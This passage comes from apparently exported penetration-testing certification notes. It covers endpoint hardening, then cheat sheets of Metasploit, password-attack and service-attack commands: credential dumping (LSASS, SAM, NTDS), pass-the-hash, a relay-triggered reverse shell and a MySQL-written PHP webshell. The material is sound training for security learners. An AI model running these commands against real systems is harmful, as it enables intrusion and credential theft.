detection & protection a bit.\n\n---\n\n## Protecting End Devices\n\n`End devices` are the devices that connect at the \"end\" of a network. This means they are either the source or destination of data transmission. Some examples of end devices would be:\n\n- Workstations (employees computers)\n- Servers (providing various services on the network)\n- Printers\n- Network Attached Storage (NAS)\n- Cameras\n- Smart TVs\n- Smart Speakers\n\nWe should prioritize the protection of these kinds of devices, especially those that run an operating system with a `CLI` that can be remotely accessed. The same interface that makes it easy to administer and automate tasks on a device can make it a good target for attackers. As simple as this seems, having anti-virus installed & enabled is a great start. The most common successful attack vector besides misconfiguration is the human element. All it takes is for a user to click a link or open a file, and they can be compromised. Having monitoring and alerting on your end devices can help detect and potentially prevent issues before they happen.\n\nOn `Windows` systems, `Windows Defender` (also known as Windows Security or Microsoft Defender) is present at install and should be left enabled. Also, ensuring the Defender Firewall is left enabled with all profiles (Domain, Private and Public) left on. Only make exceptions for approved applications based on a [change management process](https://www.atlassian.com/itsm/change-management). Establish a [patch management](https://www.rapid7.com/fundamentals/patch-management/) strategy (if not already established) to ensure that all hosts are receiving updates shortly after Microsoft releases them. All of this applies to servers hosting shared resources and websites as well. Though it can slow performance, AV on a server can prevent the execution of a payload and the establishment of a shell session with a malicious attacker's system.\n\n---\n\n## Potential Mitigations:\n\nConsider the list below when considering what implementations you can put in place to mitigate many of these vectors or exploits.\n\n- `Application Sandboxing`: By sandboxing your applications that are exposed to the world, you can limit the scope of access and damage an attacker can perform if they find a vulnerability or misconfiguration in the application.\n    \n- `Least Privilege Permission Policies`: Limiting the permissions users have can go a long way to help stop unauthorized access or compromise. Does an ordinary user need administrative access to perform their daily duties? What about domain admin? Not really, right? Ensuring proper security policies and permissions are in place will often hinder if not outright stop an attack.\n    \n- `Host Segmentation & Hardening`: Properly hardening hosts and segregating any hosts that require exposure to the internet can help ensure an attacker cannot easily hop in and move laterally into your network if they gain access to a boundary host. Following STIG hardening guides and placing hosts such as web servers, VPN servers, etc., in a DMZ or 'quarantine' network segment will stop that type of access and lateral movement.\n    \n- `Physical and Application Layer Firewalls`: Firewalls can be powerful tools if appropriately implemented. Proper inbound and outbound rules that only allow traffic first established from within your network, on ports approved for your applications, and denying inbound traffic from your network addresses or other prohibited IP space can cripple many bind and reverse shells. It adds a hop in the network chain, and network implementations such as Network Address Translation (NAT) can break the functionality of a shell payload if it is not taken into account.\n    \n\n---\n\n## Sum It All Up\n\nThese protections and mitigations are not the ends all be all for stopping attacks. A strong security posture and defense strategy are required in today's age. Adapting a defense-in-depth approach to your security posture will help hinder attackers and ensure the low-hanging fruit cannot be easily taken advantage of.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/08-Metasploit/01-Cheet Sheet Metasploit",
    "path": "02_CPTS/08-Metasploit/01-Cheet Sheet Metasploit.md",
    "title": "01 Cheet Sheet Metasploit",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "MSFconsole Commands | Command                                     | Description                                                                                                                         ...",
    "category": "02_CPTS",
    "content": "## MSFconsole Commands\n\n| **Command**                                     | **Description**                                                                                                                                   |\n| :---------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------ |\n| `show exploits`                                 | Show all exploits within the Framework.                                                                                                           |\n| `show payloads`                                 | Show all payloads within the Framework.                                                                                                           |\n| `show auxiliary`                                | Show all auxiliary modules within the Framework.                                                                                                  |\n| `search <name>`                                 | Search for exploits or modules within the Framework.                                                                                              |\n| `info`                                          | Load information about a specific exploit or module.                                                                                              |\n| `use <name>`                                    | Load an exploit or module (example: use windows/smb/psexec).                                                                                      |\n| `use <number>`                                  | Load an exploit by using the index number displayed after the search command.                                                                     |\n| `LHOST`                                         | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |\n| `RHOST`                                         | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).                                                   |\n| `setg <function>`                               | Set a specific value globally (for example, LHOST or RHOST).                                                                                      |\n| `show options`                                  | Show the options available for a module or exploit.                                                                                               |\n| `show targets`                                  | Show the platforms supported by the exploit.                                                                                                      |\n| `set target <number>`                           | Specify a specific target index if you know the OS and service pack.                                                                              |\n| `set payload <payload>`                         | Specify the payload to use.                                                                                                                       |\n| `set payload <number>`                          | Specify the payload index number to use after the show payloads command.                                                                          |\n| `show advanced`                                 | Show advanced options.                                                                                                                            |\n| `set autorunscript migrate -f`                  | Automatically migrate to a separate process upon exploit completion.                                                                              |\n| `check`                                         | Determine whether a target is vulnerable to an attack.                                                                                            |\n| `exploit`                                       | Execute the module or exploit and attack the target.                                                                                              |\n| `exploit -j`                                    | Run the exploit under the context of the job. (This will run the exploit in the background.)                                                      |\n| `exploit -z`                                    | Do not interact with the session after successful exploitation.                                                                                   |\n| `exploit -e <encoder>`                          | Specify the payload encoder to use (example: exploit –e shikata_ga_nai).                                                                          |\n| `exploit -h`                                    | Display help for the exploit command.                                                                                                             |\n| `sessions -l`                                   | List available sessions (used when handling multiple shells).                                                                                     |\n| `sessions -l -v`                                | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.                             |\n| `sessions -s <script>`                          | Run a specific Meterpreter script on all Meterpreter live sessions.                                                                               |\n| `sessions -K`                                   | Kill all live sessions.                                                                                                                           |\n| `sessions -c <cmd>`                             | Execute a command on all live Meterpreter sessions.                                                                                               |\n| `sessions -u <sessionID>`                       | Upgrade a normal Win32 shell to a Meterpreter console.                                                                                            |\n| `db_create <name>`                              | Create a database to use with database-driven attacks (example: db_create autopwn).                                                               |\n| `db_connect <name>`                             | Create and connect to a database for driven attacks (example: db_connect autopwn).                                                                |\n| `db_nmap`                                       | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)                                                  |\n| `db_destroy`                                    | Delete the current database.                                                                                                                      |\n| `db_destroy <user:password@host:port/database>` | Delete database using advanced options.                                                                                                           |\n|                                                 |                                                                                                                                                   |\n\n---\n\n## Meterpreter Commands\n\n|**Command**|**Description**|\n|:--|:--|\n|`help`|Open Meterpreter usage help.|\n|`run <scriptname>`|Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.|\n|`sysinfo`|Show the system information on the compromised target.|\n|`ls`|List the files and folders on the target.|\n|`use priv`|Load the privilege extension for extended Meterpreter libraries.|\n|`ps`|Show all running processes and which accounts are associated with each process.|\n|`migrate <proc. id>`|Migrate to the specific process ID (PID is the target process ID gained from the ps command).|\n|`use incognito`|Load incognito functions. (Used for token stealing and impersonation on a target machine.)|\n|`list_tokens -u`|List available tokens on the target by user.|\n|`list_tokens -g`|List available tokens on the target by group.|\n|`impersonate_token <DOMAIN_NAMEUSERNAME>`|Impersonate a token available on the target.|\n|`steal_token <proc. id>`|Steal the tokens available for a given process and impersonate that token.|\n|`drop_token`|Stop impersonating the current token.|\n|`getsystem`|Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.|\n|`shell`|Drop into an interactive shell with all available tokens.|\n|`execute -f <cmd.exe> -i`|Execute cmd.exe and interact with it.|\n|`execute -f <cmd.exe> -i -t`|Execute cmd.exe with all available tokens.|\n|`execute -f <cmd.exe> -i -H -t`|Execute cmd.exe with all available tokens and make it a hidden process.|\n|`rev2self`|Revert back to the original user you used to compromise the target.|\n|`reg <command>`|Interact, create, delete, query, set, and much more in the target’s registry.|\n|`setdesktop <number>`|Switch to a different screen based on who is logged in.|\n|`screenshot`|Take a screenshot of the target’s screen.|\n|`upload <filename>`|Upload a file to the target.|\n|`download <filename>`|Download a file from the target.|\n|`keyscan_start`|Start sniffing keystrokes on the remote target.|\n|`keyscan_dump`|Dump the remote keys captured on the target.|\n|`keyscan_stop`|Stop sniffing keystrokes on the remote target.|\n|`getprivs`|Get as many privileges as possible on the target.|\n|`uictl enable <keyboard/mouse>`|Take control of the keyboard and/or mouse.|\n|`background`|Run your current Meterpreter shell in the background.|\n|`hashdump`|Dump all hashes on the target. use sniffer Load the sniffer module.|\n|`sniffer_interfaces`|List the available interfaces on the target.|\n|`sniffer_dump <interfaceID> pcapname`|Start sniffing on the remote target.|\n|`sniffer_start <interfaceID> packet-buffer`|Start sniffing with a specific range for a packet buffer.|\n|`sniffer_stats <interfaceID>`|Grab statistical information from the interface you are sniffing.|\n|`sniffer_stop <interfaceID>`|Stop the sniffer.|\n|`add_user <username> <password> -h <ip>`|Add a user on the remote target.|\n|`add_group_user <\"Domain Admins\"> <username> -h <ip>`|Add a username to the Domain Administrators group on the remote target.|\n|`clearev`|Clear the event log on the target machine.|\n|`timestomp`|Change file attributes, such as creation date (antiforensics measure).|\n|`reboot`|Reboot the target machine.|\n",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/09-Password Attacks/00-CheetSheet Password Attacks",
    "path": "02_CPTS/09-Password Attacks/00-CheetSheet Password Attacks.md",
    "title": "00 CheetSheet Password Attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Connecting to Target |Command|Description| |---|---| |xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!|CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.| |evil...",
    "category": "02_CPTS",
    "content": "## Connecting to Target\n\n|**Command**|**Description**|\n|---|---|\n|`xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`|CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.|\n|`evil-winrm -i <ip> -u user -p password`|Uses Evil-WinRM to establish a Powershell session with a target.|\n|`ssh user@<ip>`|Uses SSH to connect to a target using a specified user.|\n|`smbclient -U user \\\\\\\\<ip>\\\\SHARENAME`|Uses smbclient to connect to an SMB share using a specified user.|\n|`python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/`|Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.|\n\n---\n\n## Password Mutations & Custom Wordlists\n\n|**Command**|**Description**|\n|---|---|\n|`cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`|Uses cewl to generate a wordlist based on keywords present on a website.|\n|`hashcat --force password.list -r custom.rule --stdout > mut_password.list`|Uses Hashcat to generate a rule-based word list.|\n|`./username-anarchy -i /path/to/listoffirstandlastnames.txt`|Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.|\n|`curl -s https://fileinfo.com/filetypes/compressed \\| html2text \\| awk '{print tolower($1)}' \\| grep \"\\.\" \\| tee -a compressed_ext.txt`|Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.|\n\n---\n\n## Remote Password Attacks\n\n|**Command**|**Description**|\n|---|---|\n|`netexec winrm <ip> -u user.list -p password.list`|Uses Netexec over WinRM to attempt to brute force user names and passwords specified hosted on a target.|\n|`netexec smb <ip> -u \"user\" -p \"password\" --shares`|Uses Netexec to enumerate smb shares on a target using a specified set of credentials.|\n|`hydra -L user.list -P password.list <service>://<ip>`|Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.|\n|`hydra -l username -P password.list <service>://<ip>`|Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.|\n|`hydra -L user.list -p password <service>://<ip>`|Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.|\n|`hydra -C <user_pass.list> ssh://<IP>`|Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.|\n|`netexec smb <ip> --local-auth -u <username> -p <password> --sam`|Uses Netexec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.|\n|`netexec smb <ip> --local-auth -u <username> -p <password> --lsa`|Uses Netexec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.|\n|`netexec smb <ip> -u <username> -p <password> --ntds`|Uses Netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.|\n|`evil-winrm -i <ip> -u Administrator -H \"<passwordhash>\"`|Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack.|\n|`./Pcredz -f demo.pcapng -t -v`|Extract credentials a network packet capture|\n\n---\n\n## Windows Local Password Attacks\n\n| **Command**                                                                                              | **Description**                                                                                                                                                                                        |\n| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| `tasklist /svc`                                                                                          | A command-line-based utility in Windows used to list running processes.                                                                                                                                |\n| `findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`                          | Uses Windows command-line based utility findstr to search for the string \"password\" in many different file type.                                                                                       |\n| `Get-Process lsass`                                                                                      | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.                       |\n| `rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full`                               | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.                                                                |\n| `pypykatz lsa minidump /path/to/lsassdumpfile`                                                           | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.                                                                                    |\n| `reg.exe save hklm\\sam C:\\sam.save`                                                                      | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\\sam, hklm\\security, hklm\\system). |\n| `move sam.save \\\\<ip>\\NameofFileShare`                                                                   | Uses move in Windows to transfer a file to a specified file share over the network.                                                                                                                    |\n| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`                 | Uses Secretsdump.py to dump password hashes from the SAM database.                                                                                                                                     |\n| `vssadmin CREATE SHADOW /For=C:`                                                                         | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely.                                                             |\n| `cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`.                                                                                               |\n| `rundll32 keymgr.dll,KRShowKeyMgr`                                                                       | Access the Credential Manager prompt to backup or restore saved credentials                                                                                                                            |\n| `cmdkey /list`                                                                                           | Enumerate credentials stored in the current user's profile                                                                                                                                             |\n| `runas /savecred /user:<username> cmd`                                                                   | Launch a new instance of cmd.exe while impersonating a stored user.                                                                                                                                    |\n| `snaffler.exe -s`                                                                                        | Search network shares for interesting files and credentials                                                                                                                                            |\n| `Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\\Users\\Public`                                     | Search network shares for interesting files and save the results.                                                                                                                                      |\n\n---\n\n## Linux Local Password Attacks\n\n|**Command**|**Description**|\n|---|---|\n|`for l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2>/dev/null \\| grep -v \"lib\\|fonts\\|share\\|core\" ;done`|Script that can be used to find .conf, .config and .cnf files on a Linux system.|\n|`for i in $(find / -name *.cnf 2>/dev/null \\| grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2>/dev/null \\| grep -v \"\\#\";done`|Script that can be used to find credentials in specified file types.|\n|`for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2>/dev/null \\| grep -v \"doc\\|lib\\|headers\\|share\\|man\";done`|Script that can be used to find common database files.|\n|`find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"`|Uses Linux-based find command to search for text files.|\n|`for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2>/dev/null \\| grep -v \"doc\\|lib\\|headers\\|share\";done`|Script that can be used to search for common file types used with scripts.|\n|`for ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\");do echo -e \"\\nFile extension: \" $ext; find / -name *$ext 2>/dev/null \\| grep -v \"lib\\|fonts\\|share\\|core\" ;done`|Script used to look for common types of documents.|\n|`cat /etc/crontab`|Uses Linux-based cat command to view the contents of crontab in search for credentials.|\n|`ls -la /etc/cron.*/`|Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory.|\n|`grep -rnw \"PRIVATE KEY\" /* 2>/dev/null \\| grep \":1\"`|Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys.|\n|`grep -rnw \"PRIVATE KEY\" /home/* 2>/dev/null \\| grep \":1\"`|Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory.|\n|`grep -rnw \"ssh-rsa\" /home/* 2>/dev/null \\| grep \":1\"`|Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory.|\n|`tail -n5 /home/*/.bash*`|Uses Linux-based tail command to search the through bash history files and output the last 5 lines.|\n|`python3 mimipenguin.py`|Runs Mimipenguin.py using python3.|\n|`bash mimipenguin.sh`|Runs Mimipenguin.sh using bash.|\n|`python2.7 lazagne.py all`|Runs Lazagne.py with all modules using python2.7|\n|`ls -l .mozilla/firefox/ \\| grep default`|Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep.|\n|`cat .mozilla/firefox/1bplpd86.default-release/logins.json \\| jq .`|Uses Linux-based command cat to search for credentials stored by Firefox in JSON.|\n|`python3.9 firefox_decrypt.py`|Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.|\n|`python3 lazagne.py browsers`|Runs Lazagne.py browsers module using Python 3.|\n\n---\n\n## Cracking Passwords\n\n|**Command**|**Description**|\n|---|---|\n|`hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt`|Uses Hashcat to crack NTLM hashes using a specified wordlist.|\n|`hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`|Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.|\n|`unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`|Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.|\n|`hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`|Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.|\n|`hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`|Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.|\n|`hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked`|Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.|\n|`python3 ssh2john.py SSH.private > ssh.hash`|Runs ssh2john.py script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.|\n|`john ssh.hash --show`|Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.|\n|`office2john.py Protected.docx > protected-docx.hash`|Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.|\n|`john --wordlist=rockyou.txt protected-docx.hash`|Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.|\n|`pdf2john.pl PDF.pdf > pdf.hash`|Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.|\n|`john --wordlist=rockyou.txt pdf.hash`|Runs John in conjunction with a wordlist to crack a pdf hash.|\n|`zip2john ZIP.zip > zip.hash`|Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.|\n|`john --wordlist=rockyou.txt zip.hash`|Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.|\n|`bitlocker2john -i Backup.vhd > backup.hashes`|Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.|\n|`file GZIP.gzip`|Uses the Linux-based file tool to gather file format information.|\n|`for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \\| tar xz;done`|Script that runs a for-loop to extract files from an archive.|\n\n---\n\n## Pivoting\n\n|**Command**|**Description**|\n|---|---|\n|`ssh -D 9050 user@<DMZ01>`|Establishes a SOCKS proxy on port 9050 via SSH. Once the DMZ01 host is compromised, this allows routing of traffic through the DMZ into the internal network — enabling pivoting to otherwise inaccessible systems.|\n|`sudo vim /etc/proxychains.conf`|Opens the ProxyChains configuration file in Vim. Ensure that the line `socks4 127.0.0.1 9050` is present under the `[ProxyList]` section — this defines the local SOCKS proxy (created by SSH) through which traffic will be routed. This entry may already exist but could be commented out.|\n|`sudo proxychains -q nmap -sT -Pn 172.16.119.13 --open`|Performs a TCP scan on an internal host using Nmap. The `proxychains` prefix routes the scan through the previouly established SOCKS proxy, allowing internal reconnaissance from the attacker's machine. Note that the `-sT` option is required when using Nmap with ProxyChains.|\n|`proxychains xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`|Launches an RDP session routed through the SOCKS proxy. This is useful for interacting with internal desktops (like domain-joined Windows hosts) when direct network access is not possible.|",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/09-Password Attacks/01-Introduction",
    "path": "02_CPTS/09-Password Attacks/01-Introduction.md",
    "title": "01 Introduction",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Introduction Confidentiality, integrity, and availability are at the core of every infosec practitioner's responsibilities. Without maintaining a balance among them, we cannot ensure the security of o...",
    "category": "02_CPTS",
    "content": "# Introduction\n\n`Confidentiality`, `integrity`, and `availability` are at the core of every infosec practitioner's responsibilities. Without maintaining a balance among them, we cannot ensure the security of our enterprises. This balance is preserved by auditing and accounting for each file, object, and host in the environment; by validating that users have appropriate permissions (authorization) to access those resources; and by verifying each user's identity (authentication) before granting access. Most breaches can be traced back to the breakdown of one of these three principles. This module focuses on attacking and bypassing the tenet of `authentication` by compromising user passwords across various operating systems, applications, and encryption methods. Before diving into the exciting part, `attacking passwords`, let's take a moment to discuss authentication and its components.\n\n## Authentication\n\nAuthentication, at its core, is the validation of your identity by presenting a combination of four factors to a validation mechanism. They are:\n\n1. `Something you know`: a password, passcode, pin, etc.\n2. `Something you have`: an ID Card, security key, or other MFA tools\n3. `Something you are`: your physical self, username, email address, or other identifiers\n4. `Somewhere you are`: geolocation, IP address, etc.\n\nThe process can require any or all of these authentication factors. These methods will be determined based on the severity of the information or systems accessed and how much protection they need. For example, doctors are often required to utilize a Common Access Card (CAC) paired with a pin-code or password to access any terminals that input or store patient data. Depending on the maturity of the organization's security posture, they could require all three types (A CAC, password, and pin from an authenticator app, for example).\n\nAnother simple example of this is access to our email address. The proof of information, in this case, would be the knowledge of the email address itself and the associated password. For example, a cell phone with `2FA` can be used. The third aspect can also play a role: the user's presence through biometric recognition such as a fingerprint or facial recognition.\n\nIn the previous example, the password is the authentication identifier that can be bypassed with different TTPs. This level is about authenticating the identity. Usually, only the owner and authenticating authority know the password. Authorization is carried out if the correct password is given to the authentication authority. Authorization, in this case, is the set of permissions that the user is granted upon successful authentication.\n\n## The use of passwords\n\nThe most common and widely used authentication method is still the use of passwords. But what is a password? A password or passphrase can be generally defined as `a combination of letters, numbers, and symbols in a string for identity validation.` For example, if we work with passwords and take a standard 8-digit password that consists only of upper case letters and numbers, we would get a total of `36⁸` (`208,827,064,576`) possible passwords.\n\nRealistically, it doesn't need to be a combination of those things. It could be a lyric from a song or poem, a line from a book, a phrase you can remember, or even randomly generated words concatenated together like \"TreeDogEvilElephant.\" The key is for it to meet or exceed the security standards in place by your organization. Using multiple layers to establish identity can make the entire authentication process complicated and costly. Adding complexity to the authentication process creates further effort that can add to the stresses and workload a person may have during a typical workday. Complex systems can often require inconvenient manual processes or additional steps that could significantly complicate the interaction and `user experience` (`UX`). Consider the process of shopping at an online store. Creating an account on the store website can make the authentication and checkout processes much faster than manually inputting your personal information each time you wish to make a purchase. For this reason, using a username and password to secure an account is the most widespread method of authentication that we will see again and again while keeping in mind this balance of convenience and security.\n\nA [survey](https://web.archive.org/web/20201115110047/https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf) conducted by Google and Harris Poll in 2019 reveals that `24% of Americans` have used passwords like `123456`, `qwerty` and `password`. At the time, only `15% of Americans` used password managers. It is also stated that `22%` used their `name`, and `33%` used the name of their `pet` or `children`. Another critical statistic is the `password re-use` across multiple accounts being `66%`. This means that 66% of all Americans, according to this statistic, have used the same password for multiple platforms. Therefore, once we have obtained or guessed a password, there is a 66% chance that we could use it to authenticate ourselves on other platforms with the user's ID (username or email address). This would, of course, require that we are able to guess the user's user ID, which, in many cases, is not difficult to do.\n\n[Statistics](https://web.archive.org/web/20250405101232/https://www.pandasecurity.com/en/mediacenter/password-statistics/) compiled by Panda Security in 2025 show that these trends remain similar, with some signs of improvement. `123456` is still the most common password, appearing `4.5 million times` in data breaches, and at least `23%` reuse passwords across three accounts or more. However, `36% of Americans` have adopted password managers, which is more than double the figure from 6 years prior.\n\nOne aspect of Google's survey that is somewhat more difficult to understand is that only 45% of Americans would change their passwords after a data breach. This, in turn, means that `55% still keep the password` even though it has already been leaked. We can also check if one of our email addresses is affected by various data breaches. One of the best-known sources for this is [HaveIBeenPwned](https://haveibeenpwned.com/). We enter an email address in the HaveIBeenPwned website, and it checks in its database if the email address has already been affected by any reported data breaches. If this is the case, we will see a list of all of the breaches in which our email address appears.\n\n## Digging in\n\nNow that we have defined what a password is, how we use them, and common security principles, let's dive into how we store passwords and other credentials.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/01- Cheet Sheet Attacking Common Services",
    "path": "02_CPTS/10-Attacking Common Services/01- Cheet Sheet Attacking Common Services.md",
    "title": "01  Cheet Sheet Attacking Common Services",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Attacking FTP |Command|Description| |---|---| |ftp 192.168.2.142|Connecting to the FTP server using the ftp client.| |nc -v 192.168.2.142 21|Connecting to the FTP server using netcat.| |hydra -l user1...",
    "category": "02_CPTS",
    "content": "## Attacking FTP\n\n|**Command**|**Description**|\n|---|---|\n|`ftp 192.168.2.142`|Connecting to the FTP server using the `ftp` client.|\n|`nc -v 192.168.2.142 21`|Connecting to the FTP server using `netcat`.|\n|`hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142`|Brute-forcing the FTP service.|\n\n---\n\n## Attacking SMB\n\n|**Command**|**Description**|\n|---|---|\n|`smbclient -N -L //10.129.14.128`|Null-session testing against the SMB service.|\n|`smbmap -H 10.129.14.128`|Network share enumeration using `smbmap`.|\n|`smbmap -H 10.129.14.128 -r notes`|Recursive network share enumeration using `smbmap`.|\n|`smbmap -H 10.129.14.128 --download \"notes\\note.txt\"`|Download a specific file from the shared folder.|\n|`smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\"`|Upload a specific file to the shared folder.|\n|`rpcclient -U'%' 10.10.110.17`|Null-session with the `rpcclient`.|\n|`./enum4linux-ng.py 10.10.11.45 -A -C`|Automated enumeratition of the SMB service using `enum4linux-ng`.|\n|`nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`|Password spraying against different users from a list.|\n|`impacket-psexec administrator:'Password123!'@10.10.110.17`|Connect to the SMB service using the `impacket-psexec`.|\n|`nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`|Execute a command over the SMB service using `nxc`.|\n|`nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`|Enumerating Logged-on users.|\n|`nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam`|Extract hashes from the SAM database.|\n|`nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`|Use the Pass-The-Hash technique to authenticate on the target host.|\n|`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`|Dump the SAM database using `impacket-ntlmrelayx`.|\n|`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`|Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`.|\n\n---\n\n## Attacking SQL Databases\n\n|**Command**|**Description**|\n|---|---|\n|`mysql -u julio -pPassword123 -h 10.129.20.13`|Connecting to the MySQL server.|\n|`sqlcmd -S SRVMSSQL\\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`|Connecting to the MSSQL server.|\n|`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux.|\n|`sqsh -S 10.129.203.7 -U .\\\\julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.|\n|`mysql> SHOW DATABASES;`|Show all available databases in MySQL.|\n|`mysql> USE htbusers;`|Select a specific database in MySQL.|\n|`mysql> SHOW TABLES;`|Show all available tables in the selected database in MySQL.|\n|`mysql> SELECT * FROM users;`|Select all available entries from the \"users\" table in MySQL.|\n|`sqlcmd> SELECT name FROM master.dbo.sysdatabases`|Show all available databases in MSSQL.|\n|`sqlcmd> USE htbusers`|Select a specific database in MSSQL.|\n|`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`|Show all available tables in the selected database in MSSQL.|\n|`sqlcmd> SELECT * FROM users`|Select all available entries from the \"users\" table in MSSQL.|\n|`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`|To allow advanced options to be changed.|\n|`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`|To enable the xp_cmdshell.|\n|`sqlcmd> RECONFIGURE`|To be used after each sp_configure command to apply the changes.|\n|`sqlcmd> xp_cmdshell 'whoami'`|Execute a system command from MSSQL server.|\n|`mysql> SELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE '/var/www/html/webshell.php'`|Create a file using MySQL.|\n|`mysql> show variables like \"secure_file_priv\";`|Check if the 